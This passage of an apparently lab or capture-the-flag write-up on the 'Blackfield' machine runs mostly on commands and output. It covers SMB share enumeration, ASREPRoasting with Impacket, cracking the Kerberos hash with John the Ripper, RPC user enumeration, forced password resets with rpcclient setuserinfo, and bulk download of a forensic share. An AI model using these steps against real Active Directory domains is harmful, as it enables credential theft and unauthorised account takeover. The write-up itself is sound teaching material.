fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="smb-enumeration">SMB enumeration<a href="#smb-enumeration" class="hash-link" aria-label="Direct link to SMB enumeration" title="Direct link to SMB enumeration">​</a></h2><p>Let&#x27;s find some some shares:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ smbclient -L //10.10.10.192</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Enter WORKGROUP\cyfun&#x27;s password:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Sharename       Type      Comment</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        ---------       ----      -------</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        ADMIN$          Disk      Remote Admin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        C$              Disk      Default share</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        forensic        Disk      Forensic / Audit share.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        IPC$            IPC       Remote IPC</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        NETLOGON        Disk      Logon server share</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        profiles$       Disk</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        SYSVOL          Disk      Logon server share</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">SMB1 disabled -- no workgroup available</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>There are two non-default shares:</p><ul><li>forensic</li><li>profiles$</li></ul><p>One is not accessible but the other is:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ smbclient //10.10.10.192/forensic</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Enter WORKGROUP\cyfun&#x27;s password:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Try &quot;help&quot; to get a list of possible commands.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">smb: \&gt; dir</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">NT_STATUS_ACCESS_DENIED listing \*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">smb: \&gt; ^C</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ smbclient //10.10.10.192/profiles$</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Enter WORKGROUP\cyfun&#x27;s password:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Try &quot;help&quot; to get a list of possible commands.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">smb: \&gt; dir</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  .                                   D        0  Wed Jun  3 18:47:12 2020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ..                                  D        0  Wed Jun  3 18:47:12 2020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  AAlleni                             D        0  Wed Jun  3 18:47:11 2020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ABarteski                           D        0  Wed Jun  3 18:47:11 2020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ABekesz                             D        0  Wed Jun  3 18:47:11 2020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ABenzies                            D        0  Wed Jun  3 18:47:11 2020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ABiemiller                          D        0  Wed Jun  3 18:47:11 2020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  AChampken                           D        0  Wed Jun  3 18:47:11 2020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ACheretei                           D        0  Wed Jun  3 18:47:11 2020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Those folders look like people&#x27;s profile, but there are three folders not
starting with an uppercase letter that doesn&#x27;t look like a name.</p><ul><li>audit2020</li><li>support</li><li>svc_backup</li></ul><p>We can save all profiles to a file:</p><div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ printf %s &#x27;dir&#x27; | smbclient //10.10.10.192/profiles$ &#x27;&#x27; | sed &#x27;1,3d;$d&#x27; | cut -d &#x27; &#x27; -f 3 -s &gt; profiles.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>As we know from <a href="https://nmap.org/" target="_blank" rel="noopener noreferrer">nmap</a> that the is Kerberos running, let&#x27;s try ASREPRoast.</p><blockquote><p>The ASREPRoast attack looks for users without Kerberos pre-authentication
required attribute (DONT_REQ_PREAUTH).</p></blockquote><p>Ref. <a href="https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast#asreproast" target="_blank" rel="noopener noreferrer">HackTricks - ASREPRoast</a></p><p>Then Impacket script <code>GetNPUsers</code> allow to check if Kerberos pre-auth
is enabled for those accounts and extract their password hash:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ GetNPUsers.py blackfield.local/ -usersfile profiles.txt -outputfile hash.txt -dc-ip 10.10.10.192 -format john</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] User audit2020 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] User svc_backup doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Only <em>support</em> had is hash extracted.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat hash.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$krb5asrep$support@BLACKFIELD.LOCAL:149b486205f9a8d069335550278e2933$0bfbb61c0a3af8cce3d8cd7f6584f411d9a5ac4053cdd802feadb914de2f9e5efe5f636a4ab76cca735f40754868ec140c6ed0d76ce0fc11891e17f518c5611ad1fb2e0d718f5d48a8c84fb0065e430755c9e6ee533ae52a7294b4b1132d20efc948369602dad416f819d48b0f9845268567c91ee02945d237f188162ebf0f43c7bc279ba887abf229f70319b8204ce4266d1bc98f0ce93bf28f72c1b517ab04f24db30e447085dbc156b8e5a2d8c06885e79c851b928d11975cef973a27f36169183ec240fcaca260996113052274be45c7332b202663a43516a08295f7bc25dabf07f3d86153167190e511be5d16a6cdd1ae94</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Now we can crack it with <a href="https://www.openwall.com/john/" target="_blank" rel="noopener noreferrer">John the Ripper</a>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ john hash.txt -w=/usr/share/wordlists/passwords/rockyou.txt --format=krb5asrep-aes-opencl</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ john hash.txt --show</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$krb5asrep$support@BLACKFIELD.LOCAL:#00^BlackKnight</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1 password hash cracked, 0 left</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="rpc-enumeration">RPC enumeration<a href="#rpc-enumeration" class="hash-link" aria-label="Direct link to RPC enumeration" title="Direct link to RPC enumeration">​</a></h2><p>We can know make use of the freshly discovered credentials to launch an
authenticated RPC scan to find domain users.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ rpcclient -U support -W backfield.local 10.10.10.192</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Enter BACKFIELD.LOCAL\support&#x27;s password:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rpcclient $&gt; enumdomusers</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[Administrator] rid:[0x1f4]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[Guest] rid:[0x1f5]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[krbtgt] rid:[0x1f6]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[audit2020] rid:[0x44f]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[support] rid:[0x450]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[BLACKFIELD764430] rid:[0x451]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[BLACKFIELD538365] rid:[0x452]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[BLACKFIELD438814] rid:[0x584]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[svc_backup] rid:[0x585]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user:[lydericlefebvre] rid:[0x586]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>We can see <code>lydericlefebvre</code>, a new account we didn&#x27;t see earlier.</p><p>Now let&#x27;s list the domain groups:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ rpcclient $&gt; enumdomgroups</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Domain Admins] rid:[0x200]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Domain Users] rid:[0x201]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Domain Guests] rid:[0x202]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Domain Computers] rid:[0x203]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Domain Controllers] rid:[0x204]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Schema Admins] rid:[0x206]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Enterprise Admins] rid:[0x207]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Group Policy Creator Owners] rid:[0x208]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Read-only Domain Controllers] rid:[0x209]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Cloneable Domain Controllers] rid:[0x20a]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Protected Users] rid:[0x20d]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Key Admins] rid:[0x20e]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[Enterprise Key Admins] rid:[0x20f]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">group:[DnsUpdateProxy] rid:[0x44e]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Those are only default groups. Let&#x27;s check info about the special accounts we
have.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ rpcclient $&gt; queryuser 0x586</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        User Name   :   lydericlefebvre</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Full Name   :   Lydéric aas. Lefebvre</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Home Drive  :</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Dir Drive   :</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Profile Path:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Logon Script:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Description :   @lydericlefebvre - VM Creator</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Workstations:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Comment     :</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Remote Dial :</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Logon Time               :      Thu, 01 Jan 1970 01:00:00 CET</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Logoff Time              :      Thu, 01 Jan 1970 01:00:00 CET</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Kickoff Time             :      Thu, 14 Sep 30828 04:48:05 CEST</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Password last set Time   :      Fri, 28 Feb 2020 23:33:36 CET</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Password can change Time :      Sat, 29 Feb 2020 23:33:36 CET</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Password must change Time:      Thu, 14 Sep 30828 04:48:05 CEST</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        unknown_2[0..31]...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        user_rid :      0x586</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        group_rid:      0x201</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        acb_info :      0x00000210</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        fields_present: 0x00ffffff</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        logon_divs:     168</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        bad_password_count:     0x00000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        logon_count:    0x00000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        padding1[0..7]...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        logon_hrs[0..21]...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>I don&#x27;t know if this will be useful later but we now known that <code>lydericlefebvre</code>
could be able to create VM. There was nothing special about the other accounts.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-of-machine--from-support-to-audit2020">Privilege Escalation of Machine : from support to audit2020<a href="#privilege-escalation-of-machine--from-support-to-audit2020" class="hash-link" aria-label="Direct link to Privilege Escalation of Machine : from support to audit2020" title="Direct link to Privilege Escalation of Machine : from support to audit2020">​</a></h2><p>In case our account is privileged we can try to change other account password.
<code>chgpasswd</code> won&#x27;t help us as it requires the old password. But <code>setuserinfo</code>
doesn&#x27;t.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">rpcclient $&gt; setuserinfo</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Usage: setuserinfo username level password [password_expired]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">result was NT_STATUS_INVALID_PARAMETER</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The <strong>level</strong> is defined from <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN" target="_blank" rel="noopener noreferrer">USER_INFORMATION_CLASS</a>.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">rpcclient $&gt; setuserinfo audit2020 23 cyfun123!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rpcclient $&gt; setuserinfo svc_backup 23 cyfun123!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">result: NT_STATUS_ACCESS_DENIED</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">result was NT_STATUS_ACCESS_DENIED</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">rpcclient $&gt; setuserinfo lydericlefebvre 23 cyfun123!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">result: NT_STATUS_ACCESS_DENIED</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">result was NT_STATUS_ACCESS_DENIED</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="privilege-escalation-of-machine--from-audit2020-to-svc_backup">Privilege Escalation of Machine : from audit2020 to svc_backup<a href="#privilege-escalation-of-machine--from-audit2020-to-svc_backup" class="hash-link" aria-label="Direct link to Privilege Escalation of Machine : from audit2020 to svc_backup" title="Direct link to Privilege Escalation of Machine : from audit2020 to svc_backup">​</a></h2><p>With support or unauthenticated we were not able to list the content of the
<em>forensic</em> share but we can with audit2020. So let&#x27;s dump all we can:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ mkdir -p Shares/forensic</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cd Shares/forensic</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ smbclient //10.10.10.192/forensic -U audit2020 -W blackfield.local cyfun123!</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Try &quot;help&quot; to get a list of possible commands.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">smb: \&gt; ls</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  .                                   D        0  Sun Feb 23 14:03:16 2020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  ..                                  D        0  Sun Feb 23 14:03:16 2020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  commands_output                     D        0  Sun Feb 23 19:14:37 2020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  memory_analysis                     D        0  Thu May 28 22:28:33 2020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  tools                               D        0  Sun Feb 23 14:39:08 2020</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                7846143 blocks of size 4096. 4156574 blocks available</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">smb: \&gt; recurse on</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">smb: \&gt; prompt off</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">smb: \&gt; mget *</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" 